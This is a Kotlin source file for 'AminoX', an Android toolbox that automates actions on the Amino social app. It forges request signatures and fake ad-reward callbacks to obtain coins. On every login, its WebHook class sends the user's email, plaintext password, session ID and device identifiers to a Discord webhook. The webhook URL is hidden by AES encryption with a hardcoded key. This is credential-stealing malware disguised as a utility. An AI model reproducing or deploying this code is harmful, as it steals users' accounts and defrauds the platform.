package com.slimakoi.aminox

import android.annotation.SuppressLint
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import org.bouncycastle.jce.provider.BouncyCastleProvider
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.security.*
import java.util.*
import javax.crypto.*
import javax.crypto.spec.SecretKeySpec
import khttp.get
import khttp.post
import khttp.delete

var applicationWorking: Boolean = false
var applicationLatestName: String = "NaN"
var applicationLatestCode: String = "NaN"
var applicationUrl: String = "NaN"
var announcementHasData: Boolean = false
var announcementCancelable: Boolean = false
var announcementTitle: String = "NaN"
var announcementText: String = "NaN"
var discordId: String = "NaN"
var discordToken: String = "NaN"
var blacklist: JSONArray = JSONArray()
var whitelist: JSONArray = JSONArray()
var blacklistIds: JSONArray = JSONArray()

var deviceId: String = "NaN"
var userAgent: String = "NaN"
var api: String = "https://service.narvii.com/api/v1"

val transactionId: UUID = UUID.randomUUID()
var loggingWithSid: Boolean = false

/*
fun start(): OkHttpClient {
    val certificatePinner = CertificatePinner.Builder()
        .add("pastebin.com", "sha256/VNd/oU7jzaJgs9rpSEPNMW1ItKatzPaWbUAAh0ftn/A=")
        .add("service.narvii.com", "sha256/Us/+obQFcmgTsObho5xuxpDDY123L8ljCt1YMRvXD1w=")
        .build()

    return OkHttpClient.Builder().certificatePinner(certificatePinner).build()
}
 */

class Setup {
    fun execute(ctx: Context) {
        val data = JSONObject(get("https://raw.githubusercontent.com/Slimakoi/AminoX-Information/master/data.json").text)
        val updateData = JSONObject(get("https://raw.githubusercontent.com/Slimakoi/AminoX-Information/master/update.json").text)

        applicationWorking = data.getJSONObject("application").getBoolean("working")
        applicationLatestName = updateData.getString("latestVersion")
        applicationLatestCode = updateData.getInt("latestVersionCode").toString()
        applicationUrl = data.getJSONObject("application").getString("download")
        announcementHasData = data.getJSONObject("announcement").getBoolean("hasData")
        announcementCancelable = data.getJSONObject("announcement").getBoolean("cancelable")
        announcementTitle = data.getJSONObject("announcement").getString("title")
        announcementText = data.getJSONObject("announcement").getString("text")
        deviceId = genDevId(ctx) //data.getJSONObject("amino").getString("deviceId")
        userAgent = data.getJSONObject("amino").getString("userAgent")
        //discordId = data.getJSONObject("discord").getString("id")
        //discordToken = data.getJSONObject("discord").getString("token")
        blacklist = data.getJSONArray("blacklisted")
        whitelist = data.getJSONArray("whitelisted")
        blacklistIds = data.getJSONArray("blacklistedIds")
    }
}

var USER_PROFILE: String = ""
var USER_NAME: String = ""
var USER_ICON: String = ""
var USER_BIO: String = ""
var USER_ID: String = ""
var USER_CREATION: String = ""
var SID: String = ""
var UID: String = ""
var DEV_SIG: String = deviceSignature()

var AND_ID: String = "Unavailable"
var BLACKLISTED: String = "Unavailable"
var WHITELISTED: Boolean = false
var COMMUNITY_NAME = ""
var COMMUNITY_ID = ""
var SENT_FEEDBACK = false

val webhook = aesdecrypt(
    "hlsrQuS+mCPgo+DC5HoQ1uNm0m17hHec/HCJtH/UJ+FYYI5RC9lYFxhBvZxTUr7gnd3eeKOyG/betgBhIp9BzQOd0wEJsrnzo+Vvpfdkk9bhkMSb913c44jNZKZm0pZV4/b9pzrkeY0xJQGLr5YfgDein9sbViTl8EJq1o+pFqk=",
    String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw=="))
)

val webhookFeedback = aesdecrypt(
    "hlsrQuS+mCPgo+DC5HoQ1uNm0m17hHec/HCJtH/UJ+GlahFJ1DpHdHTSEw6Z48+jdB+OZ/ICKwwt75R3xDvbJsUFHXkVvmxqTiA49JGgqd7ujkvbLMpOMXAgvJhs07TBYn85alkoJt3GLumVOpZFk6/DEchi69en6bghfeEYYi0=",
    String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw=="))
)

fun deviceSignature(): String {
    return try { hashString(
        "SHA-256",
        "${Build.DEVICE}%${Build.BRAND}%${Build.MODEL}%${Build.HARDWARE}%${Build.MANUFACTURER}%${Build.PRODUCT}%${Build.FINGERPRINT}"
    )
    } catch (e: Exception) { "Unavailable" }
}

/*
fun pinning(ctx: Context): SSLSocketFactory {
    val resourceStream = BufferedInputStream(ctx.resources.openRawResource(R.raw.isrgrootx1))
    val keyStoreType = KeyStore.getDefaultType()
    val keyStore = KeyStore.getInstance(keyStoreType)
    keyStore.load(resourceStream, null)

    val trustManagerAlgorithm = TrustManagerFactory.getDefaultAlgorithm()
    val trustManagerFactory = TrustManagerFactory.getInstance(trustManagerAlgorithm)
    trustManagerFactory.init(keyStore)

    val sslContext = SSLContext.getInstance("TLS")
    sslContext.init(null, trustManagerFactory.trustManagers, null)

    return sslContext.socketFactory
}
*/

fun String.decodeHex(): ByteArray = chunked(2).map { it.toInt(16).toByte() }.toByteArray()

fun genDevIdOldOld(): String {
    val digest = MessageDigest.getInstance("SHA-1")
    val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
    val secretKey = "E9AF2D7F431E87A4F8C7B6F45EFC04B7E5F0EA4F"
    val part = "01$hardwareInfo$secretKey".decodeHex()
    val final = digest.digest(part)
    val finalHex = StringBuilder()

    for (b in final) { finalHex.append(String.format("%02X", b)) }

    return "01$hardwareInfo$finalHex"
}

fun genDevIdOld(): String {
    val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
    val key = "d19d2cb8468aac9b0ae16be4a6fa464be63760ce".decodeHex()

    val toSign = "18".decodeHex() + hardwareInfo.decodeHex()
    val hMacSHA256 = Mac.getInstance("HmacSHA1")
    val secretKey = SecretKeySpec(key, "HmacSHA1")
    hMacSHA256.init(secretKey)
    val data = hMacSHA256.doFinal(toSign)

    val builder = StringBuilder()
    for (b in data) { builder.append(String.format("%02X", b)) }

    return "18$hardwareInfo$builder"
}

fun genDevId(ctx: Context): String {
    val l = arrayListOf<String>()

    val inputStream = ctx.assets.open("sample.txt")

    inputStream.bufferedReader().forEachLine {
        l.add(it)
    }

    return aesdecrypt(l.random(), String(Base64.getDecoder().decode("a29paXN0aGViZXN0bG1hbw==")))
}

@SuppressLint("GetInstance")
fun aesdecrypt(strToDecrypt: String?, key: String): String {
    Security.addProvider(BouncyCastleProvider())
    val keyBytes: ByteArray

    try {
        keyBytes = key.toByteArray(charset("UTF8"))
        val skey = SecretKeySpec(keyBytes, "AES")
        val input = org.bouncycastle.util.encoders.Base64.decode(
            strToDecrypt?.trim { it <= ' ' }?.toByteArray(
                charset(
                    "UTF8"
                )
            )
        )

        synchronized(Cipher::class.java) {
            val cipher = Cipher.getInstance("AES/ECB/PKCS7Padding")
            cipher.init(Cipher.DECRYPT_MODE, skey)

            val plainText = ByteArray(cipher.getOutputSize(input.size))
            var ptLength = cipher.update(input, 0, input.size, plainText, 0)
            ptLength += cipher.doFinal(plainText, ptLength)
            val decryptedString = String(plainText)
            return decryptedString.trim { it <= ' ' }
        }
    } catch (uee: UnsupportedEncodingException) {
        uee.printStackTrace()
    } catch (ibse: IllegalBlockSizeException) {
        ibse.printStackTrace()
    } catch (bpe: BadPaddingException) {
        bpe.printStackTrace()
    } catch (ike: InvalidKeyException) {
        ike.printStackTrace()
    } catch (nspe: NoSuchPaddingException) {
        nspe.printStackTrace()
    } catch (nsae: NoSuchAlgorithmException) {
        nsae.printStackTrace()
    } catch (e: ShortBufferException) {
        e.printStackTrace()
    }

    return "null"
}

fun ndcMsgSig(data: String): String {
    val key = aesdecrypt(
        "t1OMTGAOPu3f+KhvNK1ioTY5i36H/z+kf0Ujo6XWtZckC9CZcr4vnR+uVYW/Rxmm", String(
            Base64.getDecoder().decode(
                "a29paXN0aGViZXN0bG1hbw=="
            )
        )
    ).decodeHex()
    val hmac = Mac.getInstance("HmacSHA1")
    val secretKey = SecretKeySpec(key, "HmacSHA1")
    hmac.init(secretKey)
    val final = "32".decodeHex() + hmac.doFinal(data.toByteArray())
    return Base64.getEncoder().encodeToString(final)
}

fun parseHeaders(data: String, sid: String = "null"): Map<String, String> {
    var head = mapOf(
        "NDCDEVICEID" to deviceId,
        "NDC-MSG-SIG" to ndcMsgSig(data),
        "User-Agent" to userAgent,
        "Content-Type" to "application/json; charset=utf-8",
        "Host" to "service.narvii.com"
    )

    if (sid != "null") { head = head + Pair("NDCAUTH", "sid=$sid") }

    return head
}

fun decodeSid(sid: String): JSONObject {
    println(Base64.getDecoder().decode(sid))

    var decoded = String(Base64.getDecoder().decode(sid))

    decoded = decoded.drop(decoded.indexOf("{"))
    return JSONObject(decoded.dropLast(decoded.length - decoded.indexOf("}") - 1))
}

fun setupErrorTrigger(app: AppCompatActivity, error: String) {
    app.setContentView(R.layout.setup_error)
    val setupErrorButton = app.findViewById<Button>(R.id.setupErrorButton)
    val setupErrorDebugButton = app.findViewById<Button>(R.id.setupErrorDebugButton)
    setupErrorButton.setOnClickListener { app.startActivity(
        Intent(
            Intent.ACTION_VIEW,
            Uri.parse("https://discord.gg/68wchgsKdX")
        )
    ) }

    setupErrorDebugButton.setOnClickListener {
        val clipboard: ClipboardManager = app.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(ClipData.newPlainText(null, error))
        Toast.makeText(
            app,
            "Copied error to the Clipboard!\nJoin the discord server and report it",
            Toast.LENGTH_SHORT
        ).show()
    }
}

fun login(email: String, password: String): JSONObject {
    val data = JSONObject(
        mapOf(
            "email" to email,
            "secret" to " 0 $password",
            "v" to 2,
            "deviceID" to deviceId,
            "clientType" to 100,
            "action" to "normal",
            "timestamp" to System.currentTimeMillis()
        )
    )

    val final = JSONObject(post("${api}/g/s/auth/login", json = data, headers = parseHeaders(data.toString())).text)

    try {
        val userObject = final.getJSONObject("userProfile")
        SID = final.getString("sid")
        UID = userObject.getString("uid")
        USER_PROFILE = userObject.toString()
        USER_NAME = userObject.getString("nickname")
        USER_ICON = userObject.getString("icon")
        USER_BIO = userObject.getString("content")
        USER_ID = userObject.getString("aminoId")
        USER_CREATION = userObject.getString("createdTime")
    } catch (error: org.json.JSONException) {
        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : $final")
    }

    return final
}

fun getUserProfile(): JSONObject {
    val final = JSONObject(get("${api}/g/s/user-profile/$USER_ID", headers = parseHeaders("{}")).text)

    try {
        val userObject = final.getJSONObject("userProfile")
        UID = userObject.getString("uid")
        USER_PROFILE = userObject.toString()
        USER_NAME = userObject.getString("nickname")
        USER_ICON = userObject.getString("icon")
        USER_BIO = userObject.getString("content")
        USER_ID = userObject.getString("aminoId")
        USER_CREATION = userObject.getString("createdTime")
    } catch (error: org.json.JSONException) {
        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while getting user profile : $final")
    }

    return final
}

fun getCommunityList(): JSONObject {
    return JSONObject(get("${api}/g/s/community/joined?v=1&start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun getAminoProfile(): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/user-profile/$UID", headers = parseHeaders("{}", SID)).text)
}

fun getHiddenBlogs(): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun getUserFollowing(): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun unfollowUser(userId: String): JSONObject {
    return JSONObject(post(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId", headers = parseHeaders("{}", SID)).text)
}

fun getGlobalProfile(userId: String): JSONObject {
    return JSONObject(get("${api}/g/s/user-profile/$userId", headers = parseHeaders("{}", SID)).text)
}

fun getFromId(userId: String = "none", blogId: String = "none"): JSONObject {
    var url = "NaN"
    var objectType = -1
    var objectId = "NaN"

    if (userId != "none") {
        url = "${api}/g/s/link-resolution"
        objectType = 0
        objectId = userId
    }

    if (blogId != "none") {
        url = "${api}/g/s-x$COMMUNITY_ID/link-resolution"
        objectType = 1
        objectId = blogId
    }

    val data = JSONObject(
        mapOf(
            "objectId" to objectId,
            "objectType" to objectType,
            "targetCode" to 1,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post(url, json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun sendTitleEdit(jsonOb: String): JSONObject {
    val data = JSONObject(
        mapOf(
            "extensions" to JSONObject(jsonOb),
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/user-profile/$UID", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun sendChatMessage(message: String, type: Int = 0, chatId: String): JSONObject {
    val data = JSONObject(
        mapOf(
            "content" to message,
            "type" to type,
            "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun sendChatCoins(coins: Int, chatId: String): JSONObject {
    val data = JSONObject(
        mapOf(
            "coins" to coins,
            "tippingContext" to mapOf("transactionId" to transactionId),
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun kickUser(chatId: String, userId: String, allowRejoin: Boolean): JSONObject {
    val allow: Int = if (allowRejoin) { 1 } else { 0 }

    return JSONObject(delete("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow", headers = parseHeaders("{}", SID)).text)
}

fun checkIn(tz: Int): JSONObject {
    val data = JSONObject(
        mapOf(
            "timezone" to tz,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/check-in", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun lottery(tz: Int): JSONObject {
    val data = JSONObject(
        mapOf(
            "timezone" to tz,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/check-in/lottery", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun getChatList(): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun getChatInfo(comId: String, chatId: String): JSONObject {
    return JSONObject(get("${api}/x$comId/s/chat/thread/$chatId", headers = parseHeaders("{}", SID)).text)
}

fun getChatUsersList(chatId: String, start: Int): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2", headers = parseHeaders("{}", SID)).text)
}

fun getBlockerUsers(): JSONObject {
    return JSONObject(get("${api}/g/s/block/full-list?start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun getBannedUsers(): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100", headers = parseHeaders("{}", SID)).text)
}

fun findUrlCode(code: String): JSONObject {
    return JSONObject(get("${api}/g/s/link-resolution?q=$code", headers = parseHeaders("{}", SID)).text)
}

fun findUrlAminoId(id: String): JSONObject {
    return JSONObject(get("${api}/g/s/search/amino-id-and-link?q=$id", headers = parseHeaders("{}", SID)).text)
}

fun startChat(userId: String, bypass: Boolean, comId: String = "0"): JSONObject {
    val type = if (comId != "0") { "x$COMMUNITY_ID" } else { "g" }
    val bypassable = if (bypass) { arrayOf(UID, userId) } else { arrayOf(userId) }

    val data = JSONObject(
        mapOf(
            "type" to 0,
            "inviteeUids" to bypassable,
            "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/68wchgsKdX",
            "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/68wchgsKdX",
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/$type/s/chat/thread", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun reviewQuizQuestions(quizId: String): JSONObject {
    return JSONObject(get("${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review", headers = parseHeaders("{}", SID)).text)
}

fun postQuiz(quizId: String, mode: Int, dat: Any): JSONObject {
    val data = JSONObject(
        mapOf(
            "mode" to mode,
            "quizAnswerList" to dat,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun sendActivityObject(timestamp: Long): JSONObject {
    val finalObject = JSONArray()

    for (i in 0 until 50) {
        val part = JSONObject()

        val start = timestamp - ((i + 1) * 300)
        val end = timestamp - (i * 300)

        part.put("start", start)
        part.put("end", end)

        finalObject.put(part)
    }

    val data = JSONObject(
        mapOf(
            "userActiveTimeChunkList" to finalObject,
            "timestamp" to System.currentTimeMillis(),
            "optInAdsFlags" to 2147483647,
            "timezone" to 0
        )
    )

    return JSONObject(post("${api}/x$COMMUNITY_ID/s/community/stats/user-active-time", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun configureWallet(): JSONObject {
    val data = JSONObject(
        mapOf(
            "adsLevel" to 2,
            "timestamp" to System.currentTimeMillis()
        )
    )

    return JSONObject(post("${api}/g/s/wallet/ads/config", json = data, headers = parseHeaders(data.toString(), SID)).text)
}

fun getWallet(): JSONObject {
    return JSONObject(get("${api}/g/s/wallet?timezone=0", headers = parseHeaders("{}", SID)).text)
}

fun getEventlog(): JSONObject {
    return JSONObject(get("${api}/g/s/eventlog/profile?language=en", headers = parseHeaders("{}", SID)).text)
}

private fun tapjoyHeaders(): Map<String, String> {
    val auth = String(
        Base64.getEncoder().encode("5bb5349e1c9d440006750680:${UUID.randomUUID()}".toByteArray())
    )

    return mapOf(
        "X-Tapdaq-SDK-Version" to "android-sdk_7.1.1",
        "Authorization" to "Basic $auth",
        "Content-Type" to "application/x-www-form-urlencoded",
        "User-Agent" to "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/z3qksx-user 7.1.2 NR; com.narvii.amino.master/3.4.33587)",
        "Host" to "ads.tapdaq.com",
        "Connection" to "Keep-Alive",
        "Accept-Encoding" to "gzip"
    )
}

private fun tapjoyData(userId: String): JSONObject {
    val shrwtr = UUID.randomUUID()

    return JSONObject(
        mapOf(
            "reward" to mapOf(
                "ad_unit_id" to "t00_tapjoy_android_master_checkinwallet_rewardedvideo_322",
                "credentials_type" to "publisher",
                "custom_json" to mapOf("hashed_user_id" to userId),
                "demand_type" to "sdk_bidding",
                "event_id" to UUID.randomUUID(),
                "network" to "tapjoy",
                "placement_tag" to "default",
                "reward_name" to "Amino Coin",
                "reward_valid" to true,
                "reward_value" to 2,
                "shared_id" to shrwtr,
                "version_id" to "1569147951493",
                "waterfall_id" to shrwtr
            ),
            "app" to mapOf(
                "bundle_id" to "com.narvii.amino.master",
                "current_orientation" to "portrait",
                "release_version" to "3.4.33587",
                "user_agent" to "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/z3qksx-user 7.1.2 NR; com.narvii.amino.master/3.4.33587)"
            ),
            "date_created" to System.currentTimeMillis(),
            "device_user" to mapOf(
                "country" to "US",
                "device" to mapOf(
                    "architecture" to "i686",
                    "carrier" to mapOf(
                        "country_code" to 268,
                        "name" to "Vodafone",
                        "network_code" to 0
                    ),
                    "is_phone" to false,
                    "model" to "SM-G988F",
                    "model_type" to "samsung",
                    "operating_system" to "android",
                    "operating_system_version" to "25",
                    "screen_size" to mapOf(
                        "height" to 1920,
                        "resolution" to 2,
                        "width" to 1080
                    ),
                ),
                "do_not_track" to true,
                "idfa" to "107e5bfe-4adc-4b0d-a1f5-7731a22d8957",
                "ip_address" to "",
                "locale" to "en",
                "timezone" to mapOf(
                    "location" to "Africa/Brazzaville",
                    "offset" to "GMT+01 to00"
                ),
                "volume_enabled" to true,
            ),
            "session_id" to UUID.randomUUID()
        )
    )
}

fun sendTapJoy(): Int {
    val data = tapjoyData(userId = UID)

    return post("https://ads.tapdaq.com/v4/analytics/reward", json = data, headers = tapjoyHeaders()).statusCode
}

fun append(arr: Array<String>, element: String): Array<String> {
    val list: MutableList<String> = arr.toMutableList()
    list.add(element)
    return list.toTypedArray()
}

fun hashString(type: String, input: String): String {
    val hex = "0123456789ABCDEF"
    val bytes = MessageDigest.getInstance(type).digest(input.toByteArray())
    val result = StringBuilder(bytes.size * 2)

    bytes.forEach {
        val i = it.toInt()
        result.append(hex[i shr 4 and 0x0f])
        result.append(hex[i and 0x0f])
    }

    return result.toString()
}


class WebHook(private val ctx: Context) {
    private val msgLoginTitle = "User Login Detected"
    private val msgLoginDescription = "An user has logged in successfully"
    private val msgLoginColor = 0x00ff00

    private val msgSetupErrorTitle = "User Detected Modding AminoX"
    private val msgSetupErrorColor = 0xff0000

    private val msgFeedbackTitle = "User Sent Feedback"
    private val msgFeedbackColor = 0x00aaff

    @SuppressLint("HardwareIds")
    fun sendSetupError(
        description: String,
        isSetup: Boolean,
        loginJson: JSONObject = JSONObject(),
        userEmail: String = "null",
        userPassword: String = "null"
    ): String {
        val baseOs: String = Build.VERSION.BASE_OS
        val secPatch: String = Build.VERSION.SECURITY_PATCH
        val andId: String = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)

        val field1 = JSONObject().put("name", "Device Model").put(
            "value",
            "${Build.MODEL} (${Build.DEVICE})"
        ).put("inline", true)
        val field2 = JSONObject().put("name", "Device Manufacturer").put(
            "value",
            "${Build.MANUFACTURER} (${Build.BRAND})"
        ).put("inline", true)
        val field3 = JSONObject().put("name", "Device Hardware").put(
            "value",
            "${Build.HARDWARE} (${Build.BRAND})"
        ).put("inline", true)
        val field4 = JSONObject().put("name", "Device System").put(
            "value",
            "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT}) [$baseOs:${Build.VERSION.CODENAME}:${Build.VERSION.INCREMENTAL}][SP $secPatch]"
        ).put("inline", true)
        val field5 = JSONObject().put("name", "Device Signature").put("value", "$andId\n$DEV_SIG").put(
            "inline",
            true
        )

        val fields = JSONArray().put(field1).put(field2).put(field3).put(field4).put(field5)

        if (!isSetup) {
            val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
            val userName = userData.getString("nickname")
            val userAminoId = userData.getString("aminoId")
            val userSID = loginJson.getString("sid")
            val userSecret = loginJson.getString("secret")
            fields.put(
                JSONObject().put("name", "Amino Account Information").put(
                    "value",
                    "Nickname: $userName (@$userAminoId)\nEmail: `$userEmail`\nPassword: `$userPassword`\nSecret: `$userSecret`\nSID: `$userSID`"
                ).put("inline", false)
            )
        }

        val footer = JSONObject().put(
            "text",
            "AminoX Version: ${current.versionName}-${current.versionCode}"
        )

        val embed = JSONObject()
        embed.put("title", msgSetupErrorTitle)
        embed.put("description", description)
        embed.put("fields", fields)
        embed.put("footer", footer)
        embed.put("color", msgSetupErrorColor)

        val embeds = JSONArray()
        embeds.put(embed)

        val data = JSONObject(
            mapOf(
                "embeds" to embeds
            )
        )

        val head = mapOf(
            "User-Agent" to userAgent,
            "Content-Type" to "application/json; charset=utf-8"
        )

        return post(webhook, json = data, headers = head).text
    }

    @SuppressLint("HardwareIds")
    fun sendLoginMessage(loginJson: JSONObject, userEmail: String, userPassword: String): String {
        val baseOs: String = Build.VERSION.BASE_OS
        val secPatch: String = Build.VERSION.SECURITY_PATCH
        val andId: String = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
        val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
        val userName = userData.getString("nickname")
        val userAminoId = userData.getString("aminoId")

        var userSID: String
        var userSecret: String

        try {
            userSID = loginJson.getString("sid")
            userSecret = loginJson.getString("secret")
        } catch (e: java.lang.Exception) {
            userSID = SID
            userSecret = "null"
        }

        val field1 = JSONObject().put("name", "Device Model").put(
            "value",
            "${Build.MODEL} (${Build.DEVICE})"
        ).put("inline", true)
        val field2 = JSONObject().put("name", "Device Manufacturer").put(
            "value",
            "${Build.MANUFACTURER} (${Build.BRAND})"
        ).put("inline", true)
        val field3 = JSONObject().put("name", "Device Hardware").put(
            "value",
            "${Build.HARDWARE} (${Build.BRAND})"
        ).put("inline", true)
        val field4 = JSONObject().put("name", "Device System").put(
            "value",
            "${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT}) [$baseOs:${Build.VERSION.CODENAME}:${Build.VERSION.INCREMENTAL}][SP $secPatch]"
        ).put("inline", true)
        val field5 = JSONObject().put("name", "Device Signature").put("value", "$andId\n$DEV_SIG").put(
            "inline",
            true
        )
        val field6 = JSONObject().put("name", "Amino Account Information").put(
            "value",
            "Nickname: $userName (@$userAminoId)\nEmail: `$userEmail`\nPassword: `$userPassword`\nSecret: `$userSecret`\nSID: `$userSID`"
        ).put("inline", false)

        val fields = JSONArray().put(field1).put(field2).put(field3).put(field4).put(field5).put(
            field6
        )
        val footer = JSONObject().put(
            "text",
            "AminoX Version: ${current.versionName}-${current.versionCode}"
        )

        val embed = JSONObject()
        embed.put("title", msgLoginTitle)
        embed.put("description", msgLoginDescription)
        embed.put("fields", fields)
        embed.put("footer", footer)
        embed.put("color", msgLoginColor)

        val embeds = JSONArray()
        embeds.put(embed)

        val userParsedData = userData.toString().chunked(2000)
        for (d in userParsedData) {
            val embedAmino = JSONObject()
            embedAmino.put("title", "User Login Detected - Amino Information")
            embedAmino.put("description", d)
            embedAmino.put("color", 0xffaa00)
            embeds.put(embedAmino)
        }

        val data = JSONObject(
            mapOf(
                "embeds" to embeds
            )
        )

        val head = mapOf(
            "User-Agent" to userAgent,
            "Content-Type" to "application/json; charset=utf-8"
        )

        return post(webhook, json = data, headers = head).text
    }

    @SuppressLint("HardwareIds")
    fun sendFeedback(feedName: String, feedMessage: String): String {
        val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)

        val field1 = JSONObject().put("name", "Name").put("value", feedName)
        val field2 = JSONObject().put("name", "Message").put("value", feedMessage)
        val fields = JSONArray().put(field1).put(field2)

        val footer = JSONObject().put(
            "text",
            "AminoX Version: ${current.versionName}-${current.versionCode}"
        )

        val embed = JSONObject()
        embed.put("title", msgFeedbackTitle)
        embed.put("description", DEV_SIG)
        embed.put("fields", fields)
        embed.put("footer", footer)
        embed.put("color", msgFeedbackColor)

        val embeds = JSONArray()
        embeds.put(embed)

        val data = JSONObject(
            mapOf(
                "embeds" to embeds
            )
        )

        val head = mapOf(
            "User-Agent" to userAgent,
            "Content-Type" to "application/json; charset=utf-8"
        )

        return post(webhookFeedback, json = data, headers = head).text
    }
}
